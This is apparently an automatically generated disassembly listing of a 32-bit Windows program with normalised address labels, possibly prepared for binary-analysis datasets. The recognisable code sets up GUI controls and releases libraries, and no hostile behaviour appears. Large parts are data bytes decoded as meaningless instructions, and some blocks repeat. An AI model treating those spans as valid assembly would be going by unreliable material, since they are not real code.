lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45150c
add [ edi + edi * 8 + 0x30 ] ah
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pushfd
add [ eax ] eax
popad
imul ebp [ esi + 0x74 ] 0x656e6150
insb
in al dx
jbe r-xdata
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
inc ecx
add [ eax + 0x540044b0 ] ah
test [ eax + eax - 0x34 ] al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3fffbc89 ] bh
xlat
add ah ch
and [ ebx ] eax
inc edx
add [ edi ] al
inc ebp
js r-xdata
add [ ebp + 0x42e8f845 ] cl
inc esp
insb
jae r-xdata
add [ eax - 0x7c1374ab ] dl
sub_437888
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_437b3d
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_430028
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_42b418
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x60 ]
call sub_403f0c
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_433a84
mov ebx eax
mov [ esi + 0xb8 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_448fdc
push 0xa9
push 0xc8
mov ecx 0x5
mov edx 0xcc
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
call sub_433ed4
mov edx 0x6
mov eax ebx
call sub_433f0c
mov dx 0x1
mov eax ebx
call sub_44f9f4
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43feb0
mov ebx eax
mov [ esi + 0xbc ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_448fdc
push 0x9d
push 0x17
mov ecx 0x6
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x1
mov eax ebx
call sub_448498
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_436734
mov ebx eax
mov [ esi + 0xc0 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push 0x17
push 0x16
mov ecx 0x1
mov edx 0x4d
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
call sub_436f08
mov ecx r-xdata
mov edx [ rw-data ]
call sub_429eec
lea edx [ ebx + 0x80 ]
mov eax [ rw-data ]
call sub_405c78
xor edx edx
mov eax ebx
call sub_449120
mov dl 0x1
mov eax ebx
call sub_4490fc
mov [ ebx + 0x124 ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x120 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_433a84
mov ebx eax
mov [ esi + 0xc4 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_448fdc
push 0x9d
push 0x91
mov ecx 0x1d
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x5
mov eax ebx
call sub_448498
mov dl 0x2
mov eax ebx
call sub_433eb8
mov dl 0x1
mov eax ebx
call sub_433ed4
xor edx edx
mov eax ebx
call sub_44f9f4
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4332dc
mov [ esi + 0xc8 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ebx [ esi + 0xc8 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax ebx
call sub_448498
mov [ ebx + 0x12c ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x128 ] eax
mov edx [ esi + 0xc4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax ebx
call sub_433708
mov dl 0x1
mov eax ebx
call sub_4336d8
mov dl 0x1
mov eax ebx
call sub_4336b0
mov [ ebx + 0x17a ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437b44
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
add esp 0xfffffff0
call sub_40348c
sub_437b44
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_437d45
xor ebx ebx
call sub_403970
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_430228
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437de3
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403edc
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403edc
retn
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405c78
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xbc ]
call sub_448fdc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
xor edx edx
call sub_4336c8
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405c78
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc4 ]
call sub_448fdc
sub_437e00
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
xor edx edx
mov [ ebp - 0x34 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_437ed8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x3c ]
push eax
call GetClientRect
lea edx [ ebp - 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
sub edx eax
add edx eax
mov [ ebp - 0x10 ] edx
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xb8 ]
call sub_44896c
lea edx [ ebp - 0x30 ]
mov eax [ ebx + 0xc4 ]
call sub_44894c
mov edx [ ebp - 0x28 ]
mov eax [ ebx + 0xc0 ]
sub edx [ eax + 0x48 ]
sub edx 0x2
mov eax [ ebx + 0xc0 ]
call sub_4486f4
xor edx edx
mov eax [ ebx + 0xc8 ]
call sub_4336c8
lea eax [ ebx + 0xcc ]
call sub_403eb8
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_405c78
mov edx [ ebp - 0x34 ]
mov eax [ ebx + 0xc4 ]
call sub_448fdc
mov edx [ ebx + 0x3c ]
mov eax [ ebx + 0xb8 ]
call sub_44cf0c
mov eax ebx
call sub_42ff90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437edf
lea eax [ ebp - 0x34 ]
call sub_403eb8
retn
sub_437f18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi eax
xor eax eax
push ebp
push sub_43817f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_461c34
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_438162
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_462a78
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c78
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_448fdc
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_4633f8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22d ] 0x1
mov dl 0x4
mov eax [ ebp - 0x4 ]
call sub_463a58
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e4 ] edi
mov [ eax + 0x1e0 ] r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_433a84
mov ebx eax
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_448fdc
mov dl 0x5
mov eax ebx
call sub_448498
xor edx edx
mov eax ebx
call sub_433ed4
mov dl 0x1
mov eax ebx
call sub_433f28
mov edx 0x5
mov eax ebx
call sub_433f0c
mov edx 0xff000005
mov eax ebx
call sub_44914c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov [ ebx + 0x1f8 ] 0x1
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4332dc
mov esi eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax esi
call sub_448498
mov dl 0x1
mov eax esi
call sub_4336d8
mov dl 0x1
mov eax esi
call sub_433708
mov dl 0x1
mov eax esi
call sub_4336b0
mov eax [ edi + 0xc8 ]
mov edx [ eax + 0x168 ]
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_4278e4
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xec ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438169
mov eax [ ebp - 0x4 ]
call sub_403128
retn
mov eax [ ebp - 0x4 ]
call sub_4489b0
mov esi eax
mov eax ebx
call sub_4489b0
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_4278e4
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_4635c8
call sub_466d44
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
sar eax 0x2
pop edx
call sub_42ba60
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_462a18
mov eax [ ebp - 0x4 ]
call sub_4489f4
mov esi eax
mov eax ebx
call sub_4489f4
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_4278fc
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_4635c8
call sub_466d10
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
add eax 0x3
sar eax 0x2
pop edx
call sub_42ba60
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_462a48
add eax 0x3
sub_4381d4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43821f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_42b418
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x60 ]
call sub_4042c4
sete al
xor al 0x1
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438226
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_43822c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_438251
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438258
retn
sub_438273
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4382b8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4382bf
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_40496c
sub_4382db
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_438320
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438327
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_40496c
sub_438337
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43838d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438394
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403eb8
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4383a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4383e4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4383eb
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_438798
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
mov [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
mov [ ebx ] al
int3
sub_438c60
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
mov [ ebx ] es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x8c
inc ebx
add [ eax + eax ] ch
xchg esp eax
inc ecx
add [ edx + edx * 4 + 0x54100043 ] ch
push ebx
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ebx + edx * 4 + 0x41 ] cl
add [ eax ] al
xchg esp eax
xchg [ ebx ] eax
mov esp 0x7c004214
xor eax [ eax ]
je r-xdata
add [ fs : eax ] al
je r-xdata
jl r-xdata
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060008 ] al
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
xor [ ebp + 0x45 ] bl
popad
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
inc ebp
add ah dl
adc al 0x42
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add ah dh
fwait
inc ebx
add [ eax + 0x5c004217 ] bh
pop ss
inc edx
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax ] ah
pop ss
inc edx
add [ eax - 0x1fffbc6c ] dh
push esp
inc ebp
add al al
pop esi
inc ebp
add [ eax + 0x5e ] bl
inc ebp
add ah ch
popad
inc ebp
add [ esp + ebx * 4 - 0x6303ffbd ] al
inc ebx
add [ eax ] dh
popfd
inc ebx
add ah dh
pushfd
inc ebx
add [ ecx ] dl
push esp
push ebx
je r-xdata
pushad
or eax 0x33840042
inc eax
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les ecx [ ebp + 0xe00043 ]
je r-xdata
add [ 0x6d657449 ] al
adc [ eax ] al
enter 0x0 0xff
mov ah 0x97
inc ebx
add [ ecx ] al
insd
popad
add [ eax ] al
or [ eax ] 0x0
push es
dec ecx
inc ecx
add [ eax + eax ] dh
dec [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] cl
dec eax
insb
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
xchg esp eax
adc [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
fmul [ ebp + 0x11070043 ]
push esp
push ebx
je r-xdata
cld
insd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
pop eax
inc ecx
add [ eax + eax + 0x5fd4ff00 ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
jae r-xdata
outsd
outsb
je r-xdata
jo r-xdata
je r-xdata
add [ eax ] al
rol [ ebp + 0x33700043 ] 0x1
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
mov [ ebx ] es
sub al 0x0
inc eax
add ah ch
mov [ ebx ] es
pop es
adc [ ebx + edx * 2 + 0x74 ] dl
popad
je r-xdata
insd
inc ebx
jne r-xdata
js r-xdata
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
je r-xdata
add [ eax ] al
push [ eax ]
pop ebp
inc ebp
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
add [ edx + ebx * 2 + 0x10b00045 ] bh
inc edx
add [ ecx * 4 - 0x69ebffbf ] dl
pushfd
inc ebx
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
nop
inc ebx
add [ eax ] ch
add [ eax ] al
add ah dl
dec ebx
inc esp
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
add [ esi + 0x45 ] cl
xchg [ ebx ] eax
rol [ eax ] 0x0
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
dec ecx
je r-xdata
fmul [ ebp + 0x45 ]
add [ ecx + 0x45 ] ch
add [ ecx + 0x61c80045 ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5312000c ] al
arpl [ gs : edi + 0x6e ] bp
popad
jb r-xdata
jae r-xdata
mov [ ebx ] es
rol [ eax ] 0x1
add bh bh
and [ ebp + 0x10043 ] bl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
add eax 0x6d657449
xchg esp eax
adc [ eax ] al
jl r-xdata
dec eax
pop ebx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070004 ] al
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
pushad
lea eax [ ebx ]
push esp
mov [ ebx ] al
adc al [ eax ]
or [ ecx + ebp * 2 + 0x73 ] ecx
je r-xdata
add ah bh
add [ ebx + esi + 0x40 ] bh
je r-xdata
pop ecx
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x3bffbdeb ] ch
mov ah 0x44
add ah bl
adc eax 0x7ee80042
inc esp
add [ ebp + ebx * 4 + 0x7f940043 ] dl
inc esp
add [ eax + 0x15 ] ah
inc edx
add ah dh
adc eax 0x16480042
inc edx
add ah dl
jge r-xdata
pushad
adc eax 0x15f40042
inc edx
add [ eax + 0x16 ] cl
popad
je r-xdata
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060010 ] al
dec esi
inc ebp
push ebx
push 0x4374726f
jne r-xdata
add bh bh
sbb [ edi + 0x45 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
add [ eax ] al
dec [ eax - 0x69 ]
pop es
inc ebx
arpl [ esi + ebp * 2 + 0x73 ] si
sldt [ eax ]
adc [ eax ] al
mov al [ 0x48ff0000 ]
xchg esi eax
inc ebx
add [ ecx ] al
inc ebx
add al bh
push ss
inc edx
add [ ebx + edx * 2 + 0x60980045 ] cl
pop edx
inc ebp
add [ eax + 0x14004210 ] dh
lea eax [ ecx ]
adc al 0x96
insd
jae r-xdata
add [ ebp + ebx * 4 + 0x43 ] dl
add al bl
popfd
inc ebx
add [ eax - 0x63 ] ch
inc ebx
add [ esi + ebx * 4 + 0x43 ] al
add ah cl
lahf
inc ebx
add [ edi + ebx * 4 - 0x605fffbd ] bl
inc ebx
add [ edi ] cl
add [ esi + edi * 2 + 0x44 ] bh
add [ ecx + ebx * 2 + 0x59c00045 ] ch
inc ebp
add [ esi + edi * 2 + 0x59e80044 ] dh
inc ebp
add [ eax ] dl
jg r-xdata
add [ eax + 0x7f ] dl
inc esp
add [ edx + ebx * 2 ] cl
inc ebp
add [ eax ] dl
pop edx
inc ebp
add [ edi + edi * 2 + 0x44 ] dh
add ah ah
jl r-xdata
inc ebp
add [ eax + 0x7e ] cl
inc esp
add [ ecx + ebx * 2 + 0x45 ] bl
add al ch
mov ah 0x44
add al al
jg r-xdata
add [ ecx + ebx * 2 ] dh
hlt
nop
nop
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
push es
jae r-xdata
add al bh
lea eax [ ecx ]
add [ esi - 0x6c47ffbf ] cl
inc ecx
add [ eax + ebx * 4 + 0x41 ] dl
add [ eax - 0x68 ] bl
inc ecx
add [ ecx + ebx * 4 + 0x43 ] al
add [ eax ] dl
cwde
inc ecx
add al bl
0x94500043 0x41
int3
mov [ ebx ] es
pop esp
xchg [ ebx ] al
add eax [ eax ]
or [ ecx + ebp * 2 + 0x73 ] ecx
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
push esp
dec esp
add [ eax + 0xf00439f ] ah
add al dh
pop ecx
inc ebp
add [ eax ] dh
jg r-xdata
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
inc [ eax + eax * 8 + 0x458b6674 ]
cld
adc [ eax ] al
xchg [ eax ] al
add bh bh
cmp [ eax + 0x45 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x69560700
jae r-xdata
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ esp + ebx * 4 + 0x43 ] dl
arpl [ esi + ebp * 2 + 0x73 ] si
add [ eax ] al
pushad
lea eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fmul [ ebp + 0x43 ]
xor edx edx
push ebp
push sub_439187
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ esi + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x51ec8b55
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
add al bh
pop ecx
inc ebp
add al dh
mov ah 0x44
add [ eax + eax * 4 ] ah
inc esp
add [ eax + eax * 4 + 0x44 ] ah
dec edi
add [ esi ] al
bound ebp [ ebp - 0x8 ]
mov eax [ ebx ]
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ ecx ] cl
dec edi
outsb
inc edi
je r-xdata
retn
mov edx [ eax ]
call [ edx + 0x24 ]
dec eax
imul ebp [ esi + 0x74 ] r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
je r-xdata
or [ edi + 0x6e ] cl
push ebp
jo r-xdata
inc esp
insd
sub_43901c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
nop
inc ebx
add [ eax ] ch
add [ eax ] al
add ah dl
dec ebx
inc esp
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
pop ecx
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x3bffbdeb ] ch
mov ah 0x44
add ah bl
adc eax 0x7ee80042
inc esp
add [ ebp + ebx * 4 + 0x7f940043 ] dl
inc esp
add [ eax + 0x15 ] ah
inc edx
add ah dh
adc eax 0x16480042
inc edx
add ah dl
jge r-xdata
add [ ebp + ebx * 4 + 0x43 ] dl
add al bl
popfd
inc ebx
add [ eax - 0x63 ] ch
inc ebx
add [ esi + ebx * 4 + 0x43 ] al
add ah cl
lahf
inc ebx
add [ edi + ebx * 4 - 0x605fffbd ] bl
inc ebx
add [ edi ] cl
add [ esi + edi * 2 + 0x44 ] bh
add [ ecx + ebx * 2 + 0x59c00045 ] ch
inc ebp
add [ esi + edi * 2 + 0x59e80044 ] dh
inc ebp
add [ eax ] dl
jg r-xdata
add [ eax + 0x7f ] dl
inc esp
add [ edx + ebx * 2 ] cl
inc ebp
add [ eax ] dl
pop edx
inc ebp
add [ edi + edi * 2 + 0x44 ] dh
add ah ah
jl r-xdata
inc ebp
add [ eax + 0x7e ] cl
inc esp
add [ ecx + ebx * 2 + 0x45 ] bl
add al ch
mov ah 0x44
add al al
jg r-xdata
add [ ecx + ebx * 2 ] dh
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
push esp
dec esp
add [ eax + 0xf00439f ] ah
add al dh
pop ecx
inc ebp
add [ eax ] dh
jg r-xdata
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
inc [ eax + eax * 8 + 0x458b6674 ]
cld
xor edx edx
push ebp
push sub_439187
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ esi + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x51ec8b55
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
add al bh
pop ecx
inc ebp
add al dh
mov ah 0x44
add [ eax + eax * 4 ] ah
inc esp
add [ eax + eax * 4 + 0x44 ] ah
retn
mov edx [ eax ]
